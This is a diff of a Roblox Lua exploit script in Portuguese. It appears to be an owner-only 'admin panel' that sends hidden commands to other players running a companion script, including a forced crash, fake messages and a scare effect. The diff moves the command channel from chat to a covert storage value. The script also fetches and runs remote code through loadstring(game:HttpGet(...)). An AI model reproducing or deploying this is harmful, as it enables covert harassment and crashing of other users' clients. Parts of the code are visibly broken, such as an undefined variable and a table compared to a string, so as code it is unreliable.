@@ -1,68 +1,47 @@
 local DONO_USERID = 2980742903
 local Players = game:GetService("Players")
 local jogador = Players.LocalPlayer
-local TextChatService = game:GetService("TextChatService")
-local canalGeral = TextChatService:WaitForChild("TextChannels", 20):WaitForChild("RBXGeneral", 20)
+local RobloxReplicatedStorage = game:GetService("RobloxReplicatedStorage")
 
 if jogador.UserId ~= DONO_USERID then jogador:Kick("Acesso negado.") return end
 
-local clientesAtivos = {}
+local PonteOrdens = RobloxReplicatedStorage:FindFirstChild("OrvexNetworkComms") or Instance.new("StringValue", RobloxReplicatedStorage)
+PonteOrdens.Name = "OrvexNetworkComms"
+PonteOrdens.Value = ""
+
+local ListaAtivos = RobloxReplicatedStorage:FindFirstChild("OrvexActiveClients") or Instance.new("StringValue", RobloxReplicatedStorage)
+ListaActive.Name = "OrvexActiveClients"
+
 local usuarioSelecionadoTroll = ""
 local textoFakeMensagem = ""
 
--- Escuta os retornos "new123" disparados apenas pelos scripts legítimos
-TextChatService.OnIncomingMessage = function(mensagemObj)
-    local texto = mensagemObj.Text
-    local remetente = mensagemObj.TextSource
-    if texto == "new123" and remetente then
-        local playerInstancia = Players:GetPlayerByUserId(remetente.UserId)
-        if playerInstancia and playerInstancia ~= jogador then
-            clientesAtivos[playerInstancia.Name] = os.clock()
-        end
-    end
-    return nil
-end
-
 local function obterListaJogadoresDedicada()
-    local lista = {}
-    local tempoLimite = os.clock() - 15 -- Janela de tolerância estendida após a verificação manual
-    for nome, t in pairs(clientesAtivos) do
-        if Players:FindFirstChild(nome) and t > tempoLimite then
-            table.insert(lista, nome)
-        else
-            clientesAtivos[nome] = nil
+    if ListaAtivos.Value == "" then return {"Nenhum usuário detectado"} end
+    local brutos = string.split(ListaAtivos.Value, ",")
+    local validados = {}
+    for _, nome in ipairs(brutos) do
+        if Players:FindFirstChild(nome) and not table.find(validados, nome) then
+            table.insert(validados, nome)
         end
     end
-    if #lista == 0 then return {"Nenhum usuário detectado"} end
-    return lista
+    if #validados == 0 then return {"Nenhum usuário detectado"} end
+    return validados
 end
 
-local function enviarComandoRede(cmd, arg, forcarSemAlvo)
-    if (usuarioSelecionadoTroll ~= "" and usuarioSelecionadoTroll ~= "Nenhum usuário detectado") or forcarSemAlvo then
-        if canalGeral then
-            pcall(function()
-                canalGeral:SendAsync(string.format("[ORVEX-CMD] %s | %s", cmd, arg))
-            end)
-        end
+local function enviarComandoRede(cmd, arg)
+    if usuarioSelecionadoTroll ~= "" and usuarioSelecionadoTroll ~= "Nenhum usuário detectado" then
+        PonteOrdens.Value = string.format("%s|%s|%s|%s", usuarioSelecionadoTroll, cmd, arg, tostring(os.clock()))
     end
 end
 
 local Rayfield = loadstring(game:HttpGet("https://sirius.menu/gen2"))()
-local Window = Rayfield:CreateWindow({Name = "ORVEX | ADMIN PAINEL", Subtitle = "Gerenciamento Otimizado", Theme = "Default"})
+local Window = Rayfield:CreateWindow({Name = "ORVEX | ADMIN PAINEL", Subtitle = "Painel Silencioso", Theme = "Default"})
 local TabMonitor = Window:CreateTab({ Name = "Monitor", Icon = "rbxassetid://100604009889706" })
 local TabTroll = Window:CreateTab({ Name = "Troll", Icon = "rbxassetid://10651147057" })
 
-TabMonitor:CreateSection({ Name = "Gerenciamento e Varredura Manual" })
-TabMonitor:CreateButton({
-    Name = "Verificar Rede (Detectar Usuários)",
-    Callback = function()
-        enviarComandoRede("SolicitarVerificacao", "true", true)
-        Rayfield:Notify({Title = "Varredura", Content = "Sinal de checagem enviado. Aguardando retornos...", Duration = 3})
-    end
-})
-
+TabMonitor:CreateSection({ Name = "Monitoramento Direto de Memória" })
 local LabelContador = TabMonitor:CreateText({ Name = "Contador", Text = "Usuários com script ativo: 0" })
-local LabelLista = TabMonitor:CreateText({ Name = "Usuários Online", Text = "Aperte em Verificar Rede para escanear." })
+local LabelLista = TabMonitor:CreateText({ Name = "Usuários Online", Text = "Sincronizando..." })
 
 local DropdownTroll = TabTroll:CreateDropdown({
     Name = "Selecionar Alvo da Rede",
@@ -80,11 +59,12 @@ TabTroll:CreateButton({Name = "Enviar Mensagem Simulada", Callback = function() 
 TabTroll:CreateButton({Name = "Provocar Travamento (Crash)", Callback = function() enviarComandoRede("ForcarCrash", "true") end})
 TabTroll:CreateToggle({Name = "Efeito Susto", CurrentValue = false, Callback = function(v) enviarComandoRede("EfeitoSusto", v and "ATIVAR" or "DESATIVAR") end})
 
+-- Loop de atualização assíncrona constante com atualização visual forçada na aba Troll
 task.spawn(function()
-    while task.wait(3) do
+    while task.wait(1.5) do
         pcall(function()
             local ativos = obterListaJogadoresDedicada()
-            DropdownTroll:Refresh(ativos)
+            DropdownTroll:Refresh(ativos, true)
             if ativos == "Nenhum usuário detectado" then
                 LabelContador:Set("Usuários com script ativo: 0")
                 LabelLista:Set("Online: Nenhum")
